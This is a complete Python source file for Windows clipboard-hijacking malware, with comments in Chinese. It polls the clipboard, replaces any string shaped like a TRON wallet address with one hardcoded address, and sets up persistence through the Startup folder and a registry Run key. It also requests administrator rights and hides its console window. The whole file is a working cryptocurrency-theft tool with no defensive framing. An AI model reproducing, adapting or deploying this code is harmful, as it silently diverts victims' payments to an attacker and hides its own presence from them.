import time
import re
import subprocess
import sys
import shutil
import os
import winreg as reg
import ctypes
import random

# 自动安装pyperclip模块
def install_pyperclip():
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyperclip'])
    except subprocess.CalledProcessError:
        print("安装pyperclip模块失败，请手动安装后再运行此脚本。")
        sys.exit(1)

# 检查并安装pyperclip模块
try:
    import pyperclip
except ImportError:
    print("未找到pyperclip模块，正在尝试自动安装...")
    install_pyperclip()
    import pyperclip

# 监控剪贴板内容并修改
def monitor_clipboard():
    while True:
        clipboard_text = pyperclip.paste()
        
        # 正则表达式匹配以'T'开头且至少包含20个字符的字母和数字组合
        pattern = r'\bT\w{19,}\b'
        
        # 检查剪贴板内容是否匹配模式
        if re.search(pattern, clipboard_text):
            # 将剪贴板内容替换为指定的字符串
            modified_text = re.sub(pattern, 'TNERnQ4nRP8ksgStJLvQhj1oprQAkPnhda', clipboard_text)
            pyperclip.copy(modified_text)
            print(f'剪贴板内容已修改: {clipboard_text} -> {modified_text}')
        
        # 每秒检查一次剪贴板内容
        time.sleep(1)

# 将脚本添加到用户的启动项中
def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    target_path = os.path.join(startup_folder, os.path.basename(script_path))
    
    if not os.path.exists(target_path):
        try:
            shutil.copy(script_path, startup_folder)
            print(f'已将脚本复制到启动文件夹: {startup_folder}')
        except Exception as e:
            print(f'复制脚本到启动文件夹时出错: {e}')
    else:
        print('脚本已经在启动文件夹中')
    
    key_name = 'MonitorClipboardScript'
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    
    try:
        key = reg.HKEY_CURRENT_USER
        with reg.OpenKey(key, key_path, 0, reg.KEY_ALL_ACCESS) as reg_key:
            reg.SetValueEx(reg_key, key_name, 0, reg.REG_SZ, script_path)
            print(f'已将脚本添加到注册表启动项: {key_path}\\{key_name}')
    except Exception as e:
        print(f'添加注册表启动项时出错: {e}')

    print('脚本自动启动设置完成')

# 检查并以管理员权限运行
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script_path = os.path.abspath(__file__)
    params = ' '.join([script_path] + sys.argv[1:])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

# 隐藏控制台窗口
def hide_console():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)

if __name__ == '__main__':
    if not is_admin():
        run_as_admin()
    else:
        hide_console()
        add_to_startup()
        try:
            import pyperclip
            monitor_clipboard()
        except ImportError:
            install_pyperclip()
            subprocess.Popen(['pythonw', os.path.abspath(__file__)])
